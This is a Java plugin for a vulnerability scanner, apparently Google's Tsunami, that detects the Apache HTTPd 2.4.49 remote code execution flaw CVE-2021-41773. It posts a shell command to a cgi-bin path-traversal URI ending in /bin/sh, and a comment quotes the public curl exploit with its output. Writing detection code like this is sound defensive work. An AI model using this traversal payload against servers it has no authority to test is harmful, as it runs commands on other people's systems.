/*
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.rce.cve202141773;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.ByteString;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpRequest;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.proto.AdditionalDetail;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.TextData;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import javax.inject.Inject;

/** A VulnDetector plugin that scans for the CVE-2021-41773 Apache RCE, which is present on a
 * vulnerable Apache instance with CGI enabled. Those instances are not detected by the classic path
 * traversal detection. */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "Cve202141773DetectorWithPayload",
    version = "0.1",
    description = "This is a detector for the RCE part of the vulnerable Apache HTTPd (2.4.49)"
                  + " (CVE-2021-41773)",
    author = "Andreas Geiger (andreasgeiger@google.com)",
    bootstrapModule = Cve202141773DetectorWithPayloadBootstrapModule.class)
@ForWebService
public final class Cve202141773DetectorWithPayload implements VulnDetector {
  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  private final Clock utcClock;
  private final HttpClient httpClient;
  private final PayloadGenerator payloadGenerator;

  @Inject
  Cve202141773DetectorWithPayload(
      @UtcClock Clock utcClock, HttpClient httpClient, PayloadGenerator payloadGenerator) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient).modify().setFollowRedirects(false).build();
    this.payloadGenerator = checkNotNull(payloadGenerator);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("Cve202141773DetectorWithPayload starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    PayloadGeneratorConfig config =
        PayloadGeneratorConfig.newBuilder()
            .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.REFLECTIVE_RCE)
            .setInterpretationEnvironment(
                PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
            .setExecutionEnvironment(
                PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
            .build();

    Payload payload = this.payloadGenerator.generate(config);

    String commandToInject = payload.getPayload();

    // normal exploit from https://github.com/blasty/CVE-2021-41773
    // curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; id'
    // "http://localhost:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
    // --> uid=33(www-data) gid=33(www-data) groups=33(www-data)
    String targetUri =
        String.format(
            "http://%s%s",
            toUriAuthority(networkService.getNetworkEndpoint()),
            "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh");

    String postData =
      String.format(
        "echo Content-Type: text/plain; echo; %s",
        commandToInject);

    HttpRequest req =
        HttpRequest.post(targetUri)
            .withEmptyHeaders()
            .setRequestBody(ByteString.copyFromUtf8(postData))
            .build();

    try {
      //sendAsIs is used, with send the path traversal does not work
      HttpResponse res = this.httpClient.sendAsIs(req);

      return res.status().isSuccess() && payload.checkIfExecuted(res.bodyBytes());
    } catch (IOException e) {
      return false;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("GOOGLE")
                        .setValue("CVE_2021_41773"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Apache RCE Vulnerability CVE-2021-41773")
                .setDescription("This version of Apache is vulnerable to a Remote Code Execution "
                  + "vulnerability described in CVE-2021-41773. The attacker has the user "
                  + "permissions of the Apache process. For more information see "
                  + "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41773")
                .setRecommendation("Update to 2.4.51 release.")
                .addAdditionalDetails(
                    AdditionalDetail.newBuilder()
                        .setTextData(
                            TextData.newBuilder().setText("This detector checks only for the RCE "
                            + "vulnerability described in the CVE-2021-41773 and not for the path "
                            + "traversal described in the same CVE. If CGI is enabled on Apache in "
                            + "a vulnerable version the path traversal is not detected anymore by "
                            + "common detectors. In this case this detector finds the RCE. The "
                            + "detector can be tested with the following docker containers "
                            + "https://github.com/BlueTeamSteve/CVE-2021-41773"))))
        .build();
  }
}
